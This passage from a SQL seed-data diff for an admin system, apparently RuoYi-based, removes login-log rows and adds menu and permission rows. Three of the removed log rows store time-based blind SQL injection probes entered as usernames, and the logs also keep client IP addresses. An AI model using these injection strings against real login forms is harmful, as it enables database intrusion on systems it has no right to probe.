-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:26'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:26'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:26'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:27'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:27'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:28'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:28'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:28'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:28');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:29'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:29'),
-       ('admin''and(select/**/1)>0/**/waitfor/**/delay''0:0:5', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1',
-        '登录用户：admin''and(select/**/1)>0/**/waitfor/**/delay''0:0:5 不存在', '2023-05-04 16:48:29'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:30'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:30'),
-       ('admin"and(select/**/1)>0/**/waitfor/**/delay"0:0:5', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1',
-        '登录用户：admin"and(select/**/1)>0/**/waitfor/**/delay"0:0:5 不存在', '2023-05-04 16:48:30'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:30'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:30'),
-       ('admin/**/and/**/0=DBMS_PIPE.RECEIVE_MESSAGE(''q'',5)', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1',
-        '登录用户：admin/**/and/**/0=DBMS_PIPE.RECEIVE_MESSAGE(''q'',5) 不存在', '2023-05-04 16:48:30'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:31');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:31'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:32'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:32'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-06 17:16:45'),
-       ('admin', '121.33.67.128', 'XX XX', 'Chrome 11', 'Windows 10', '0', '登录成功', '2023-05-19 20:54:57'),
-       ('admin', '183.214.218.143', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '登录成功', '2023-05-26 14:15:58'),
-       ('admin', '116.21.178.223', 'XX XX', 'Chrome 11', 'Windows 10', '0', '登录成功', '2023-06-17 15:00:58'),
-       ('admin', '116.21.178.223', 'XX XX', 'Chrome 11', 'Windows 10', '0', '登录成功', '2023-06-17 18:25:32'),
-       ('admin', '116.21.178.223', 'XX XX', 'Chrome 11', 'Windows 10', '0', '退出成功', '2023-06-17 18:26:42'),
-       ('admin', '116.21.178.223', 'XX XX', 'Chrome 11', 'Windows 10', '0', '登录成功', '2023-06-17 18:35:24');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('admin', '116.21.178.223', 'XX XX', 'Chrome 11', 'Windows 10', '0', '退出成功', '2023-06-17 18:35:30'),
-       ('admin', '58.62.191.228', 'XX XX', 'Chrome 11', 'Windows 10', '0', '登录成功', '2023-06-18 03:18:14'),
-       ('admin', '58.62.191.228', 'XX XX', 'Chrome 11', 'Windows 10', '0', '退出成功', '2023-06-18 03:18:33'),
-       ('admin', '58.62.191.228', 'XX XX', 'Chrome 11', 'Windows 10', '0', '登录成功', '2023-06-18 15:32:27'),
-       ('admin', '58.62.191.228', 'XX XX', 'Chrome 11', 'Windows 10', '0', '退出成功', '2023-06-18 15:33:19'),
-       ('SSSDNSY', '58.62.191.228', 'XX XX', 'Chrome 11', 'Windows 10', '0', '登录成功', '2023-06-18 15:35:32'),
-       ('SSSDNSY', '27.47.134.48', 'XX XX', 'Chrome 11', 'Windows 10', '0', '登录成功', '2023-06-23 18:15:07'),
-       ('SSSDNSY', '27.47.134.48', 'XX XX', 'Chrome 11', 'Windows 10', '0', '退出成功', '2023-06-23 18:23:08'),
-       ('admin', '27.47.134.48', 'XX XX', 'Chrome 11', 'Windows 10', '0', '登录成功', '2023-06-23 18:23:10'),
-       ('admin', '27.47.134.48', 'XX XX', 'Chrome 11', 'Windows 10', '0', '退出成功', '2023-06-23 18:34:10');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('admin', '27.47.134.48', 'XX XX', 'Chrome 11', 'Windows 10', '0', '登录成功', '2023-06-23 18:34:12'),
-       ('admin', '27.47.134.48', 'XX XX', 'Chrome 11', 'Windows 10', '0', '登录成功', '2023-06-23 19:26:50'),
-       ('admin', '27.47.134.48', 'XX XX', 'Chrome 11', 'Windows 10', '0', '退出成功', '2023-06-23 19:34:51'),
-       ('admin', '27.47.134.48', 'XX XX', 'Chrome 11', 'Windows 10', '0', '登录成功', '2023-06-23 19:34:53'),
-       ('admin', '121.33.64.87', 'XX XX', 'Chrome 11', 'Windows 10', '0', '登录成功', '2023-07-02 15:12:39');
+
+INSERT INTO melon.sys_menu (menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type,
+                            visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
+VALUES ('系统管理', 0, 1, 'system', NULL, '', 1, 0, 'M', '0', '0', '', 'system', 'admin', '2023-01-30 13:46:09', '', NULL,
+        '系统管理目录'),
+       ('系统监控', 0, 2, 'monitor', NULL, '', 1, 0, 'M', '0', '0', '', 'monitor', 'admin', '2023-01-30 13:46:09', '', NULL,
+        '系统监控目录'),
+       ('系统工具', 0, 3, 'tool', NULL, '', 1, 0, 'M', '0', '0', '', 'tool', 'admin', '2023-01-30 13:46:09', '', NULL,
+        '系统工具目录'),
+       ('若依官网', 0, 0, 'http://ruoyi.vip', NULL, '', 0, 0, 'M', '1', '0', '', 'guide', 'admin', '2023-01-30 13:46:09',
+        'admin', '2023-07-06 19:54:24', '若依官网地址'),
+       ('用户管理', 1, 1, 'user', 'system/user/index', '', 1, 0, 'C', '0', '0', 'system:user:list', 'user', 'admin',
+        '2023-01-30 13:46:09', '', NULL, '用户管理菜单'),
+       ('角色管理', 1, 2, 'role', 'system/role/index', '', 1, 0, 'C', '0', '0', 'system:role:list', 'peoples', 'admin',
+        '2023-01-30 13:46:09', '', NULL, '角色管理菜单'),
+       ('菜单管理', 1, 3, 'menu', 'system/menu/index', '', 1, 0, 'C', '0', '0', 'system:menu:list', 'tree-table', 'admin',
+        '2023-01-30 13:46:09', '', NULL, '菜单管理菜单'),
+       ('部门管理', 1, 4, 'dept', 'system/dept/index', '', 1, 0, 'C', '0', '0', 'system:dept:list', 'tree', 'admin',
+        '2023-01-30 13:46:09', '', NULL, '部门管理菜单'),
+       ('岗位管理', 1, 5, 'post', 'system/post/index', '', 1, 0, 'C', '0', '0', 'system:post:list', 'post', 'admin',
+        '2023-01-30 13:46:09', '', NULL, '岗位管理菜单'),
+       ('字典管理', 1, 6, 'dict', 'system/dict/index', '', 1, 0, 'C', '0', '0', 'system:dict:list', 'dict', 'admin',
+        '2023-01-30 13:46:09', '', NULL, '字典管理菜单');
+INSERT INTO melon.sys_menu (menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type,
+                            visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
+VALUES ('参数设置', 1, 7, 'config', 'system/config/index', '', 1, 0, 'C', '0', '0', 'system:config:list', 'edit', 'admin',
+        '2023-01-30 13:46:09', '', NULL, '参数设置菜单'),
+       ('通知公告', 1, 8, 'notice', 'system/notice/index', '', 1, 0, 'C', '0', '0', 'system:notice:list', 'message',
+        'admin', '2023-01-30 13:46:09', '', NULL, '通知公告菜单'),
+       ('日志管理', 1, 9, 'log', '', '', 1, 0, 'M', '0', '0', '', 'log', 'admin', '2023-01-30 13:46:09', '', NULL,
+        '日志管理菜单'),
+       ('在线用户', 2, 1, 'online', 'monitor/online/index', '', 1, 0, 'C', '0', '0', 'monitor:online:list', 'online',
+        'admin', '2023-01-30 13:46:09', '', NULL, '在线用户菜单'),
+       ('定时任务', 2, 2, 'job', 'monitor/job/index', '', 1, 0, 'C', '0', '0', 'monitor:job:list', 'job', 'admin',
+        '2023-01-30 13:46:09', '', NULL, '定时任务菜单'),
+       ('数据监控', 2, 3, 'druid', 'monitor/druid/index', '', 1, 0, 'C', '0', '0', 'monitor:druid:list', 'druid', 'admin',
+        '2023-01-30 13:46:09', '', NULL, '数据监控菜单'),
+       ('服务监控', 2, 4, 'server', 'monitor/server/index', '', 1, 0, 'C', '0', '0', 'monitor:server:list', 'server',
+        'admin', '2023-01-30 13:46:09', '', NULL, '服务监控菜单'),
+       ('缓存监控', 2, 5, 'cache', 'monitor/cache/index', '', 1, 0, 'C', '0', '0', 'monitor:cache:list', 'redis', 'admin',
+        '2023-01-30 13:46:09', '', NULL, '缓存监控菜单'),
+       ('缓存列表', 2, 6, 'cacheList', 'monitor/cache/list', '', 1, 0, 'C', '0', '0', 'monitor:cache:list', 'redis-list',
+        'admin', '2023-01-30 13:46:09', '', NULL, '缓存列表菜单'),
+       ('表单构建', 3, 1, 'build', 'tool/build/index', '', 1, 0, 'C', '0', '0', 'tool:build:list', 'build', 'admin',
+        '2023-01-30 13:46:09', '', NULL, '表单构建菜单');
+INSERT INTO melon.sys_menu (menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type,
+                            visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
+VALUES ('代码生成', 3, 2, 'gen', 'tool/gen/index', '', 1, 0, 'C', '0', '0', 'tool:gen:list', 'code', 'admin',
+        '2023-01-30 13:46:09', '', NULL, '代码生成菜单'),
+       ('系统接口', 3, 3, 'doc', 'tool/knife4j/index', '', 1, 0, 'C', '0', '0', 'tool:swagger:list', 'swagger', 'admin',
+        '2023-01-30 13:46:09', '', NULL, '系统接口菜单'),
+       ('操作日志', 108, 1, 'operlog', 'monitor/operlog/index', '', 1, 0, 'C', '0', '0', 'monitor:operlog:list', 'form',
+        'admin', '2023-01-30 13:46:09', '', NULL, '操作日志菜单'),
+       ('登录日志', 108, 2, 'logininfor', 'monitor/logininfor/index', '', 1, 0, 'C', '0', '0', 'monitor:logininfor:list',
+        'logininfor', 'admin', '2023-01-30 13:46:09', '', NULL, '登录日志菜单'),
+       ('用户查询', 100, 1, '', '', '', 1, 0, 'F', '0', '0', 'system:user:query', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('用户新增', 100, 2, '', '', '', 1, 0, 'F', '0', '0', 'system:user:add', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('用户修改', 100, 3, '', '', '', 1, 0, 'F', '0', '0', 'system:user:edit', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('用户删除', 100, 4, '', '', '', 1, 0, 'F', '0', '0', 'system:user:remove', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('用户导出', 100, 5, '', '', '', 1, 0, 'F', '0', '0', 'system:user:export', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('用户导入', 100, 6, '', '', '', 1, 0, 'F', '0', '0', 'system:user:import', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, '');
+INSERT INTO melon.sys_menu (menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type,
+                            visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
+VALUES ('重置密码', 100, 7, '', '', '', 1, 0, 'F', '0', '0', 'system:user:resetPwd', '#', 'admin', '2023-01-30 13:46:09',
+        '', NULL, ''),
+       ('角色查询', 101, 1, '', '', '', 1, 0, 'F', '0', '0', 'system:role:query', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('角色新增', 101, 2, '', '', '', 1, 0, 'F', '0', '0', 'system:role:add', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('角色修改', 101, 3, '', '', '', 1, 0, 'F', '0', '0', 'system:role:edit', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('角色删除', 101, 4, '', '', '', 1, 0, 'F', '0', '0', 'system:role:remove', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('角色导出', 101, 5, '', '', '', 1, 0, 'F', '0', '0', 'system:role:export', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('菜单查询', 102, 1, '', '', '', 1, 0, 'F', '0', '0', 'system:menu:query', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('菜单新增', 102, 2, '', '', '', 1, 0, 'F', '0', '0', 'system:menu:add', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('菜单修改', 102, 3, '', '', '', 1, 0, 'F', '0', '0', 'system:menu:edit', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('菜单删除', 102, 4, '', '', '', 1, 0, 'F', '0', '0', 'system:menu:remove', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, '');
+INSERT INTO melon.sys_menu (menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type,
+                            visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
+VALUES ('部门查询', 103, 1, '', '', '', 1, 0, 'F', '0', '0', 'system:dept:query', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('部门新增', 103, 2, '', '', '', 1, 0, 'F', '0', '0', 'system:dept:add', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('部门修改', 103, 3, '', '', '', 1, 0, 'F', '0', '0', 'system:dept:edit', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('部门删除', 103, 4, '', '', '', 1, 0, 'F', '0', '0', 'system:dept:remove', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('岗位查询', 104, 1, '', '', '', 1, 0, 'F', '0', '0', 'system:post:query', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('岗位新增', 104, 2, '', '', '', 1, 0, 'F', '0', '0', 'system:post:add', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('岗位修改', 104, 3, '', '', '', 1, 0, 'F', '0', '0', 'system:post:edit', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('岗位删除', 104, 4, '', '', '', 1, 0, 'F', '0', '0', 'system:post:remove', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('岗位导出', 104, 5, '', '', '', 1, 0, 'F', '0', '0', 'system:post:export', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('字典查询', 105, 1, '#', '', '', 1, 0, 'F', '0', '0', 'system:dict:query', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, '');
+INSERT INTO melon.sys_menu (menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type,
+                            visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
+VALUES ('字典新增', 105, 2, '#', '', '', 1, 0, 'F', '0', '0', 'system:dict:add', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('字典修改', 105, 3, '#', '', '', 1, 0, 'F', '0', '0', 'system:dict:edit', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('字典删除', 105, 4, '#', '', '', 1, 0, 'F', '0', '0', 'system:dict:remove', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('字典导出', 105, 5, '#', '', '', 1, 0, 'F', '0', '0', 'system:dict:export', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('参数查询', 106, 1, '#', '', '', 1, 0, 'F', '0', '0', 'system:config:query', '#', 'admin', '2023-01-30 13:46:09',
+        '', NULL, ''),
+       ('参数新增', 106, 2, '#', '', '', 1, 0, 'F', '0', '0', 'system:config:add', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('参数修改', 106, 3, '#', '', '', 1, 0, 'F', '0', '0', 'system:config:edit', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('参数删除', 106, 4, '#', '', '', 1, 0, 'F', '0', '0', 'system:config:remove', '#', 'admin', '2023-01-30 13:46:09',
+        '', NULL, ''),
+       ('参数导出', 106, 5, '#', '', '', 1, 0, 'F', '0', '0', 'system:config:export', '#', 'admin', '2023-01-30 13:46:09',
+        '', NULL, ''),
+       ('公告查询', 107, 1, '#', '', '', 1, 0, 'F', '0', '0', 'system:notice:query', '#', 'admin', '2023-01-30 13:46:09',
+        '', NULL, '');
+INSERT INTO melon.sys_menu (menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type,
+                            visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
+VALUES ('公告新增', 107, 2, '#', '', '', 1, 0, 'F', '0', '0', 'system:notice:add', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('公告修改', 107, 3, '#', '', '', 1, 0, 'F', '0', '0', 'system:notice:edit', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('公告删除', 107, 4, '#', '', '', 1, 0, 'F', '0', '0', 'system:notice:remove', '#', 'admin', '2023-01-30 13:46:09',
+        '', NULL, ''),
+       ('操作查询', 500, 1, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:operlog:query', '#', 'admin', '2023-01-30 13:46:09',
+        '', NULL, ''),
+       ('操作删除', 500, 2, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:operlog:remove', '#', 'admin', '2023-01-30 13:46:09',
+        '', NULL, ''),
+       ('日志导出', 500, 3, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:operlog:export', '#', 'admin', '2023-01-30 13:46:09',
+        '', NULL, ''),
+       ('登录查询', 501, 1, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:logininfor:query', '#', 'admin',
+        '2023-01-30 13:46:09', '', NULL, ''),
+       ('登录删除', 501, 2, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:logininfor:remove', '#', 'admin',
+        '2023-01-30 13:46:09', '', NULL, ''),
+       ('日志导出', 501, 3, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:logininfor:export', '#', 'admin',
+        '2023-01-30 13:46:09', '', NULL, ''),
+       ('账户解锁', 501, 4, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:logininfor:unlock', '#', 'admin',
+        '2023-01-30 13:46:09', '', NULL, '');
+INSERT INTO melon.sys_menu (menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type,
+                            visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
+VALUES ('在线查询', 109, 1, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:online:query', '#', 'admin', '2023-01-30 13:46:09',
+        '', NULL, ''),
+       ('批量强退', 109, 2, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:online:batchLogout', '#', 'admin',
+        '2023-01-30 13:46:09', '', NULL, ''),
+       ('单条强退', 109, 3, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:online:forceLogout', '#', 'admin',
+        '2023-01-30 13:46:09', '', NULL, ''),
+       ('任务查询', 110, 1, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:job:query', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('任务新增', 110, 2, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:job:add', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('任务修改', 110, 3, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:job:edit', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('任务删除', 110, 4, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:job:remove', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('状态修改', 110, 5, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:job:changeStatus', '#', 'admin',
+        '2023-01-30 13:46:09', '', NULL, ''),
+       ('任务导出', 110, 6, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:job:export', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('生成查询', 116, 1, '#', '', '', 1, 0, 'F', '0', '0', 'tool:gen:query', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, '');
+INSERT INTO melon.sys_menu (menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type,
+                            visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
+VALUES ('生成修改', 116, 2, '#', '', '', 1, 0, 'F', '0', '0', 'tool:gen:edit', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('生成删除', 116, 3, '#', '', '', 1, 0, 'F', '0', '0', 'tool:gen:remove', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('导入代码', 116, 4, '#', '', '', 1, 0, 'F', '0', '0', 'tool:gen:import', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('预览代码', 116, 5, '#', '', '', 1, 0, 'F', '0', '0', 'tool:gen:preview', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('生成代码', 116, 6, '#', '', '', 1, 0, 'F', '0', '0', 'tool:gen:code', '#', 'admin', '2023-01-30 13:46:09', '',
+        NULL, ''),
+       ('配置管理', 0, 4, 'config', '', '', 1, 0, 'M', '0', '0', '', 'component', 'admin', '2023-01-25 12:00:23', 'admin',
+        '2023-01-25 13:18:04', ''),
+       ('配置列表', 2000, 1, 'config', 'config/conf/index', '', 1, 0, 'C', '0', '0', 'config:project:list', 'code', 'admin',
+        '2023-01-25 12:02:03', 'SSSDNSY', '2023-03-27 16:09:34', ''),
+       ('环境管理', 2000, 2, 'env', 'config/env/index', '', 1, 0, 'C', '0', '0', '', 'swagger', 'admin',
+        '2023-01-25 13:13:34', 'admin', '2023-01-25 13:14:35', ''),
+       ('项目管理', 2000, 3, 'project', 'config/project/index', '', 1, 0, 'C', '0', '0', '', 'example', 'admin',
+        '2023-01-25 13:14:09', '', NULL, ''),
+       ('编辑权限', 2001, 1, '', NULL, NULL, 1, 0, 'F', '0', '0', 'config:conf:edit', '#', 'SSSDNSY', '2023-03-27 16:08:02',
+        '', NULL, '');
+INSERT INTO melon.sys_menu (menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type,
+                            visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
+VALUES ('导出权限', 2001, 2, '', NULL, NULL, 1, 0, 'F', '0', '0', 'config:conf:export', '#', 'SSSDNSY',
+        '2023-03-27 16:08:48', '', NULL, ''),
+       ('查询权限', 2001, 3, '', NULL, NULL, 1, 0, 'F', '0', '0', 'config:conf:list', '#', 'admin', '2023-03-27 16:18:27',
+        '', NULL, ''),
+       ('编辑权限', 2002, 1, '', NULL, NULL, 1, 0, 'F', '0', '0', 'config:env:edit', '#', 'SSSDNSY', '2023-03-27 16:08:02',
+        '', NULL, ''),
+       ('导出权限', 2002, 2, '', NULL, NULL, 1, 0, 'F', '0', '0', 'config:env:export', '#', 'SSSDNSY',
+        '2023-03-27 16:08:48', '', NULL, ''),
+       ('查询权限', 2002, 3, '', NULL, NULL, 1, 0, 'F', '0', '0', 'config:env:list', '#', 'admin', '2023-03-27 16:18:27',
+        '', NULL, ''),
+       ('编辑权限', 2003, 1, '', NULL, NULL, 1, 0, 'F', '0', '0', 'config:project:edit', '#', 'SSSDNSY',
+        '2023-03-27 16:08:02', '', NULL, ''),
+       ('导出权限', 2003, 2, '', NULL, NULL, 1, 0, 'F', '0', '0', 'config:project:export', '#', 'SSSDNSY',
+        '2023-03-27 16:08:48', '', NULL, ''),
+       ('查询权限', 2003, 3, '', NULL, NULL, 1, 0, 'F', '0', '0', 'config:project:list', '#', 'admin',
+        '2023-03-27 16:18:27', '', NULL, ''),
+       ('更多', 1560609093179654146, 1, 'flow', NULL, NULL, 1, 0, 'M', '0', '0', '', 'edit', 'SSSDNSY',
+        '2023-06-23 18:17:20', 'admin', '2023-07-12 11:10:30', ''),
+       ('流程编辑', 2015, 1, 'flowEditor', 'bpmn/flow/definition/flowEditor', '', 1, 0, 'C', '0', '0', '', 'documentation',
+        'admin', '2023-06-23 19:41:08', 'admin', '2023-07-12 11:09:36',
+        '2016	模型管理	2015	1	modelList	activiti/ModelList		1	0	C	0	0		documentation	admin	2023-06-23 19:41:08	admin	2023-06-23 19:41:47	');
+INSERT INTO melon.sys_menu (menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type,
+                            visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
+VALUES ('更多', 1560607731675021314, 10, 'form', NULL, NULL, 1, 0, 'M', '0', '0', '', 'form', 'admin',
+        '2023-07-06 19:53:27', 'admin', '2023-07-12 11:10:26', ''),
+       ('表单管理', 2018, 1, 'formManager', 'bpmn/form/FormManager', NULL, 1, 0, 'C', '0', '0', NULL, 'build', 'admin',
+        '2023-07-06 19:56:51', '', NULL, ''),
+       ('流程监控', 3000, 30, 'flowMonitor', NULL, NULL, 1, 0, 'M', '0', '0', NULL, 'cascader', 'admin',
+        '2023-07-12 11:11:44', '', NULL, ''),
+       ('实例', 2020, 1, 'instManager', '/bpmn/inst/InstManager', NULL, 1, 0, 'M', '0', '0', NULL, 'druid', 'admin',
+        '2023-07-12 11:13:45', '', NULL, ''),
+       ('任务', 2020, 5, 'taskManager', 'bpmn/task/TaskManager', NULL, 1, 0, 'C', '0', '0', NULL, 'documentation',
+        'admin', '2023-07-12 11:14:25', '', NULL, ''),
+       ('统计', 2020, 15, 'statistics', 'bpmn/stat/Statistics', NULL, 1, 0, 'C', '0', '0', NULL, 'chart', 'admin',
+        '2023-07-12 11:15:33', '', NULL, ''),
+       ('流程设计', 2015, 1, 'flowDesigner', 'bpmn/flow/definition/index', '', 1, 0, 'C', '0', '0', '', 'documentation',
+        'admin', '2023-06-23 19:41:08', 'admin', '2023-07-12 11:09:36',
+        '2016	模型管理	2015	1	modelList	activiti/ModelList		1	0	C	0	0		documentation	admin	2023-06-23 19:41:08	admin	2023-06-23 19:41:47	'),
+       ('流程分类', 2015, 1, 'flowCategory', 'bpmn/flow/category/index', '', 1, 0, 'C', '0', '0', '', 'documentation',
+        'admin', '2023-06-23 19:41:08', 'admin', '2023-07-12 11:09:36',
+        '2016	模型管理	2015	1	modelList	activiti/ModelList		1	0	C	0	0		documentation	admin	2023-06-23 19:41:08	admin	2023-06-23 19:41:47	'),
+       ('数据同步', 3, 10, 'dataSync', 'tool/sync/index', NULL, 1, 0, 'C', '0', '0', NULL, 'server', 'admin',
+        '2023-07-17 13:55:08', '', NULL, ''),
+       ('test', 0, 0, '1', '1', '1', 1, 1, '1', '1', '1', '1', '1', 'admin', '2023-07-20 14:25:16', '', NULL, '');
+INSERT INTO melon.sys_menu (menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type,
+                            visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
+VALUES ('工作流程', 0, 15, 'workflow', '', '', 1, 0, 'M', '0', '0', '', 'tree-table', 'admin', '2021-10-05 18:22:30',
+        'admin', '2021-10-23 14:31:30', ''),
+       ('模型管理', 1560609093179654146, 10, 'model', 'workflow/model/index2', '', 1, 0, 'C', '0', '0',
+        'workflow:model:list', 'build', 'admin', '2021-10-05 18:23:36', 'admin', '2022-08-19 20:46:49', ''),
+       ('流程定义', 1560609093179654146, 20, 'definition', 'workflow/definition/index', '', 1, 1, 'C', '0', '0', '',
